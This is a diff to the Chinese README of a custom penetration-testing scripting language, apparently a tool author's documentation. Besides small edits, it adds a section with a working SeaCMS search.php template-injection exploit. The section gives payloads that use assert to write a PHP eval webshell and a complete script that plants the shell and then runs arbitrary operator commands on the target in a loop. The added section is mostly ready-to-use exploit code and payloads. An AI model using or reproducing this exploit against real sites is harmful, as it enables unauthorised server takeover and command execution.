@@ -1,6 +1,6 @@
 # Wker Test Langue
 
-没有想到更好的名字，暂时先用这个名字吧，写这个脚本语言目的是为了避免类似于python那样，及时poc和exp编写的很多，但是想要统一规范的利用（对某个站点一次性测试很多脚本）还是比较困难的，所以我就写了这个脚本语言，为的是能够更有效率的进行渗透测试。
+没有想到更好的名字，暂时先用这个名字吧，写这个脚本语言目的是为了避免类似于python那样，即使poc和exp编写的很多，但是想要统一规范的利用（对某个站点一次性测试很多脚本）还是比较困难的，所以我就写了这个脚本语言，为的是能够更有效率的进行渗透测试。
 
 即可以含有编程语言的灵活性，又不缺失程序框架的规范性，这是高效率的一种体现。
 
@@ -491,6 +491,17 @@ function main(args)
 这个在之后的批量运行时是十分重要的！
 
 虽然们可以使用`input`库函数从命令行得到输出结果，但是这并不是一个框架性质的做法，所以建议使用`#request`来从全局中得到值，当然`#request`可以是`var`也可以是`array`！
+
+#### #include
+
+可以使用#include包含已经写好的脚本（调入已经写好的函数，让代码更有层次化），可以使用绝对路径，也可是相对于script的相对路径。
+
+例：
+
+```js
+#include ATTACKUTILS/SQLAttack.wker
+```
+
 
 ### 注释
 
@@ -1425,7 +1436,7 @@ function TakeLength(url,sentence,length){
 
 存在验证码的话呢请看之前的文章，如何实现存在验证码的暴力破解
 
-### 后记
+### 完整代码
 
 其实我这里编写的只是一个框架，如果js加密比较复杂那么还是需要进行许多其他的获取，这里只是最简单的操作
 
@@ -1532,3 +1543,147 @@ function Enc(str)
 ```
 
 js代码就不带了。
+
+### 漏洞分析
+
+拿个seacms的getshell吧，网上虽然有payload，但是貌似都是到phpinfo就停止了的。
+
+所以我就下载下来自己去复现。
+
+```
+http://www.seacms1.com/search.php
+
+POST:searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if}
+```
+
+phpinfo那个地方修改成自己的函数，理论上来说这样就可以了，我们就可以改成自己的马了，但是不巧的是order参数多了一个`addslashes`函数，所以会稍微麻烦一些。
+
+主要的思路是使用断言，然后传递个没有过滤的参数进去就可以了，所以可以构造下面的payload：
+
+```
+searchtype=5&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen("shell.php","w"),'<?php @eval($_POST['test']); ?>')
+```
+
+但是改成一句话的时候又出现了问题，不知道是他做了啥过滤还是啥（没仔细去看），反正cmd参数里面有个$（$_POST['test']）这个就是不行，很麻烦，所以最后不得不间接执行一下了，所以我给出一个最终的payload：
+
+1. 首先先写入payload：
+
+   1. ```
+      searchtype=5&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen("shell.php","w"),'<?php @eval(fread(fopen("shell.txt","r"),filesize("shell.txt"))); ?>')
+      ```
+
+   2. 这个是可以上传上去的，原理是我们不要$，而是执行的代码放在shell.txt里面
+
+2. 写入shell.txt我们想要执行的php语句
+
+3. 最后访问shell.php
+
+这样子做就是动作有点大，但是勉勉强强满足了getshell的要求
+
+### exp的编写
+
+#### 上传shell
+
+首先是先上传我们的shell.php：
+
+```js
+#define getshellpayload = searchtype=5&order=%7D%7Bend%20if%7D%7Bif%3A1%29print%5Fr%28%24%5FPOST%5Bfunc%5D%28%24%5FPOST%5Bcmd%5D%29%29%3B%2F%2F%7D%7Bend%20if%7D&func=assert&cmd=fwrite%28fopen%28%22shell.php%22%2C%22w%22%29%2C%27%3C%3Fphp%20%40eval%28fread%28fopen%28%22shell.txt%22%2C%22r%22%29%2Cfilesize%28%22shell.txt%22%29%29%29%3B%20%3F%3E%27%29
+
+function GetShell(url){
+	return HttpPost(url."/search.php",getshellpayload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+}
+```
+
+这个就是简单的post请求，将结果数组返回回去，目的是为了判断是否写入了shell.php。
+
+#### 上传shell.txt
+
+```js
+#define injectionTxtpayloadqian = searchtype=5&order=%7D%7Bend%20if%7D%7Bif%3A1%29print%5Fr%28%24%5FPOST%5Bfunc%5D%28%24%5FPOST%5Bcmd%5D%29%29%3B%2F%2F%7D%7Bend%20if%7D&func=assert&cmd=fwrite%28fopen%28%22shell.txt%22%2C%22w%22%29%2C%27system%28%22
+#define injectionTxtpayloadhou = %22%29%3B%27%29
+function injectionTxt(url,cmd){
+	return HttpPost(url."/search.php",injectionTxtpayloadqian.URLEncode(cmd).injectionTxtpayloadhou,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+}
+```
+
+这个也是同理，post请求，将我们想要之后的cmd拼接进去，然后得到shell.txt
+
+#### 查看结果
+
+```js
+function GetRes(url){
+	res = HttpGet(url."/shell.php","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	return res[0];
+}
+```
+
+请求shell.php，将得到的页面结果返回回去。
+
+#### 执行逻辑
+
+```js
+function main(args)
+{
+	print("请输入要测试的URL:");
+	webUrl = input();
+	res = GetShell(webUrl);
+	if(StrFindStr(res[1],"200 OK",0) == "-1"){
+		print("getshell失败");
+		return "";
+	}
+	while(1 == 1){
+		print("请输入要执行的命令(输入exit退出)");
+		cmd = input();
+		if(cmd == "exit"){
+			break;
+		}
+		injectionTxt(webUrl,cmd);
+		print(GetRes(webUrl));
+	}
+	
+}
+```
+
+先得到shell，如果没得到的话呢就直接返回，如果得到的话呢就输入执行的命令，然后注入到shell.txt里面，最终得到结果。
+
+#### 完整代码
+
+```js
+#define getshellpayload = searchtype=5&order=%7D%7Bend%20if%7D%7Bif%3A1%29print%5Fr%28%24%5FPOST%5Bfunc%5D%28%24%5FPOST%5Bcmd%5D%29%29%3B%2F%2F%7D%7Bend%20if%7D&func=assert&cmd=fwrite%28fopen%28%22shell.php%22%2C%22w%22%29%2C%27%3C%3Fphp%20%40eval%28fread%28fopen%28%22shell.txt%22%2C%22r%22%29%2Cfilesize%28%22shell.txt%22%29%29%29%3B%20%3F%3E%27%29
+#define injectionTxtpayloadqian = searchtype=5&order=%7D%7Bend%20if%7D%7Bif%3A1%29print%5Fr%28%24%5FPOST%5Bfunc%5D%28%24%5FPOST%5Bcmd%5D%29%29%3B%2F%2F%7D%7Bend%20if%7D&func=assert&cmd=fwrite%28fopen%28%22shell.txt%22%2C%22w%22%29%2C%27system%28%22
+#define injectionTxtpayloadhou = %22%29%3B%27%29
+function injectionTxt(url,cmd){
+	return HttpPost(url."/search.php",injectionTxtpayloadqian.URLEncode(cmd).injectionTxtpayloadhou,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+}
+function GetShell(url){
+	return HttpPost(url."/search.php",getshellpayload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+}
+function GetRes(url){
+	res = HttpGet(url."/shell.php","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	return res[0];
+}
+function main(args)
+{
+	print("请输入要测试的URL:");
+	webUrl = input();
+	res = GetShell(webUrl);
+	if(StrFindStr(res[1],"200 OK",0) == "-1"){
+		print("getshell失败");
+		return "";
+	}
+	while(1 == 1){
+		print("请输入要执行的命令(输入exit退出)");
+		cmd = input();
+		if(cmd == "exit"){
+			break;
+		}
+		injectionTxt(webUrl,cmd);
+		print(GetRes(webUrl));
+	}
+	
+}
+```
+
+看一下最终的执行结果：
+
+![res](jpg/30.jpg)
